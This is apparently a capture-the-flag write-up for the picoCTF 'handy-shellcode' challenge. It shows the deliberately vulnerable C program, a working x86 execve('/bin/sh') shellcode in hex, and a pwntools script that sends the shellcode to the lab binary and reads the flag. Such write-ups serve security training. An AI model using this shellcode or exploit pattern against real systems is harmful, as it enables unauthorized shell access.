# handy-shellcode - Points: 50

## Description

This program executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/handy-shellcode_3_1a2e95a810eefe4a5994631812c0b8af on the shell server. Source.

## Solution

We're given a binary as well as the source code for this challenge.
The source code is shown below:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 148
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts("Enter your shellcode:");
  vuln(buf);

  puts("Thanks! Executing now...");

  ((void (*)())buf)();


  puts("Finishing Executing Shellcode. Exiting now...");

  return 0;
}
```

We can see that the ```vuln()``` function stores user input using ```gets(buf)``` and that memory at the address of ```buf``` is executed as a function here:

```c
((void (*)())buf)();
```

As the name of the challenge suggests, we need to input shell code that will allow us to read the flag file.
This can be done by calling ```/bin/sh``` and sending commands through ```stdin```.

To do this, I used shellcode from http://shell-storm.org/shellcode/ for Linux/Intel x86.
The code I chose was execve("/bin/sh") by Magnefikko, which can be found here: http://shell-storm.org/shellcode/files/shellcode-585.php

```
\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68
```

## Exploit script

I used pwntools to connect to the shell server, start the process, and send the shellcode and commands to read the flag.
I then switched to interactive mode to receive the flag and allow me to input any other commands, though permissions were restricted to reading this flag only.

```py
#!/usr/bin/python
from pwn import *
from getpass import getpass

pico_user = input("Username: ")[:-1]
pico_pass = getpass("Password: ")

conn = ssh(host = '2019shell1.picoctf.com', user = pico_user, password = pico_pass)

location = '/problems/handy-shellcode_3_1a2e95a810eefe4a5994631812c0b8af'

print("running vuln")
vuln = conn.process(location + '/vuln')

print("sending payload")
vuln.sendlineafter('shellcode', '\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68')
vuln.sendlineafter('$', 'cd ' + location)
vuln.sendlineafter('$', 'cat ' + location + '/flag.txt')

print("done")
vuln.interactive()
```
